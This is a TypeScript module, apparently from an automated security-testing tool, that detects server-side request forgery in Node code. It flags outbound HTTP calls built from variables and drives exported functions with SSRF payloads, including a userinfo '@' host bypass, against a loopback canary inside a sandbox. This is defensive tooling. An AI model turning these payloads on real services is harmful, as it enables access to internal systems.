import { readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { Exploit } from "../types.js";
import type { Sandbox } from "../sandbox.js";
import { type Attacker, type StaticLead, NODE_RUN, NODE_SOURCE_RE, freshMarker, nodeExportedNames, scanSinkLeads } from "./attacker.js";

const HERE = dirname(fileURLToPath(import.meta.url));

// An SSRF sink: an outbound HTTP call whose URL is built from a variable (template, bare identifier,
// or concatenation) rather than a fixed literal. Covers global fetch, axios/got/undici, and node
// http(s). A lead, not a finding — whether the *host* is attacker-influenced is what the PoC decides.
const SINK_RE =
  /\b(?:fetch|axios(?:\.(?:get|post|put|delete|patch|head|request))?|got(?:\.(?:get|post|put|delete|patch|head))?|undici\.(?:fetch|request)|https?\.(?:get|request))\s*\(\s*(?:`[^`]*\$\{|[A-Za-z_$][\w$.]*\s*[,)]|['"][^'"]*['"]\s*\+)/;

function firstSinkLine(source: string): number {
  const lines = source.split("\n");
  for (let i = 0; i < lines.length; i++) if (SINK_RE.test(lines[i])) return i + 1;
  return 1;
}

/**
 * A self-contained CommonJS driver that PROVES SSRF with an out-of-band signal and zero external
 * network: it starts a throwaway HTTP listener on 127.0.0.1:<ephemeral>, then calls the target's
 * exported `fnName` with a series of payloads pointing at that listener — a full loopback URL (a sink
 * that fetches the raw argument), a `@`-userinfo host (a sink that appends the argument to a fixed
 * host prefix — `https://api.example.com` + `@127.0.0.1:P/…` resolves to the listener), and a
 * scheme-relative form. If the app makes the request, the listener sees the per-run marker in the
 * path → `oob-request` fired. The marker cannot arrive by coincidence, and nothing leaves the box.
 */
function ssrfCanaryDriver(moduleRel: string, fnName: string, marker: string): string {
  const mod = JSON.stringify("./" + moduleRel);
  const fn = JSON.stringify(fnName);
  const mk = JSON.stringify(marker);
  // ESM driver (top-level await), run under `node --experimental-transform-types` so `import()`
  // reaches .ts / .mjs / .cjs / .js entrypoints alike.
  return `
import http from "node:http";
const MARKER = ${mk};
let firedPayload = null, currentPayload = null, hitLine = null;
const server = http.createServer((req, res) => {
  const line = (req.url || "") + " host=" + (req.headers.host || "");
  if (line.indexOf(MARKER) !== -1) { firedPayload = currentPayload; hitLine = line; }
  res.statusCode = 200; res.end("ok");
});
server.on("error", () => {});
await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const port = server.address().port;
let m;
try { m = await import(${mod}); } catch (e) { process.stdout.write("IMPORT_FAIL:" + e); server.close(); process.exit(0); }
const fn = (m && m[${fn}]) || (m && m.default && (m.default[${fn}] || m.default));
if (typeof fn !== "function") { process.stdout.write("NOT_A_FUNCTION"); server.close(); process.exit(0); }
const payloads = [
  "http://127.0.0.1:" + port + "/" + MARKER,   // sink fetches the raw argument
  "@127.0.0.1:" + port + "/" + MARKER,          // sink appends arg to a fixed host prefix (userinfo bypass)
  "//127.0.0.1:" + port + "/" + MARKER,         // scheme-relative append
];
for (const pl of payloads) {
  if (firedPayload) break;
  currentPayload = pl;
  try { await fn(pl); } catch (e) { /* the request may throw after the connection lands; the OOB hit still counts */ }
  await new Promise((r) => setTimeout(r, 150));
}
process.stdout.write(firedPayload ? ("OOB_FIRED payload=" + firedPayload + " req=" + hitLine) : "no-oob");
server.close();
`.trim();
}

export class SsrfAttacker implements Attacker {
  readonly attackClass = "ssrf" as const;
  readonly canaryFixtureDir = resolve(HERE, "..", "..", "fixtures", "ssrf-node");

  handles(file: string): boolean {
    return NODE_SOURCE_RE.test(file);
  }

  staticLeads(source: string): StaticLead[] {
    return scanSinkLeads(source, SINK_RE);
  }

  hunt(targetDir: string, files: string[], sandbox: Sandbox): Exploit[] {
    const exploits: Exploit[] = [];
    for (const file of files) {
      if (!this.handles(file)) continue;
      let source: string;
      try {
        source = readFileSync(join(targetDir, file), "utf8");
      } catch {
        continue;
      }
      if (!SINK_RE.test(source)) continue; // no outbound-request lead
      const names = nodeExportedNames(source);
      if (names.length === 0) continue; // reachable sink but no exported entrypoint to drive
      const sinkLine = firstSinkLine(source);
      const sink = (source.match(SINK_RE)?.[0] ?? "fetch").split("(")[0].trim();

      let fired = false;
      for (const name of names) {
        if (fired) break;
        const marker = freshMarker();
        const driverRel = `.raeuber-driver-${marker}.mjs`;
        sandbox.writeFile(driverRel, ssrfCanaryDriver(file, name, marker));
        const run = sandbox.exec(`${NODE_RUN} ${driverRel} 2>&1`, 20_000);
        const out = run.stdout + run.stderr;
        if (out.includes("OOB_FIRED") && out.includes(marker)) {
          const payload = out.match(/OOB_FIRED payload=(\S+)/)?.[1] ?? `http://127.0.0.1/${marker}`;
          exploits.push({
            attackClass: "ssrf",
            proof: "oob-request",
            file,
            line: sinkLine,
            sink,
            summary: `Untrusted first argument of exported \`${name}()\` reaches an outbound request with no host allowlist; a loopback-canary URL was fetched (SSRF).`,
            payload,
            evidence:
              `driver started a 127.0.0.1 canary; ${name}(${JSON.stringify(payload)}) made an ` +
              `out-of-band request carrying marker ${marker}:\n` +
              out.slice(0, 800),
          });
          fired = true;
        }
      }
    }
    return exploits;
  }
}
